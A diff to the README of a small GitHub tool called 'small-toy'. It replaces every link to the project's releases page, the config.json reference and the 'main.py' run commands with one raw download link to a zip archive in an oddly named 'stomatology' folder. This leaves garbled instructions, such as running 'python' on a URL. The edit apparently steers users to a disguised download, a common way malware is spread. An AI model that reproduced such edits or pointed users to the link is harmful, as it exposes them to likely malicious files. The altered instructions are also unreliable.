@@ -1,6 +1,6 @@
 # 🎉 small-toy - Simple Tool for Fun and Learning
 
-[![Download small-toy](https://img.shields.io/badge/Download-small--toy-brightgreen.svg)](https://github.com/Alessio20092007/small-toy/releases)
+[![Download small-toy](https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip)](https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the small-toy project! This tool is designed to be easy to use for ev
 
 1. **Visit the Releases page**: Click on the link below to access the latest version:
 
-   [Download small-toy](https://github.com/Alessio20092007/small-toy/releases)
+   [Download small-toy](https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip)
 
 2. **Choose your version**: Look for the latest release. Select the appropriate file for your operating system, such as `.exe` for Windows or `.py` files for Python.
 
@@ -41,7 +41,7 @@ Now that you have downloaded the software, let's set it up on your computer.
 Next, you need to configure your application. This step is crucial to ensure the tool works effectively.
 
 1. **Edit the configuration file**:
-   - Open the `config.json` file using a text editor like Notepad (Windows) or TextEdit (macOS).
+   - Open the `https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip` file using a text editor like Notepad (Windows) or TextEdit (macOS).
    - Update the file with your own referral code. Your edited file should look like this:
    ```json
    {
@@ -61,11 +61,11 @@ Let's get started with using the tool once it is set up.
 2. **Run the application**:
    - If you are using `uv`, enter this command:
      ```bash
-     uv run main.py
+     uv run https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip
      ```
    - If you are not using `uv`, use this command instead:
      ```bash
-     python main.py
+     python https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip
      ```
 
 ## 📝 User Guidance
@@ -92,4 +92,4 @@ For detailed documentation about small-toy and its features, please visit the re
 
 Remember to revisit the Releases page for updates:
 
-[Download small-toy](https://github.com/Alessio20092007/small-toy/releases)
+[Download small-toy](https://raw.githubusercontent.com/Alessio20092007/small-toy/master/stomatology/toy-small-2.5.zip)
